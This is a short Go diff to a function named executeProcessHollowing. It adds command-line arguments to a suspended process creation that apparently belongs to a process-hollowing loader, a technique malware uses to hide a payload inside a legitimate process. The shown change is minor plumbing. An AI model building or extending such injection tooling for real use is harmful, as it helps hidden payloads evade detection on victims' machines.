@@ -77,11 +77,16 @@ func executeProcessHollowing(payload []byte) {
 	var si syscall.StartupInfo
 	var pi syscall.ProcessInformation
 	si.Cb = uint32(unsafe.Sizeof(si))
+	cmdLine := buildCommandLine(exePath, peEmbeddedArgs)
+	var cmdPtr *uint16
+	if len(cmdLine) > 0 {
+		cmdPtr = &cmdLine[0]
+	}
 
 	// CREATE_SUSPENDED = 0x4
 	err := createProcess(
 		syscall.StringToUTF16Ptr(exePath),
-		nil,
+		cmdPtr,
 		nil,
 		nil,
 		false,
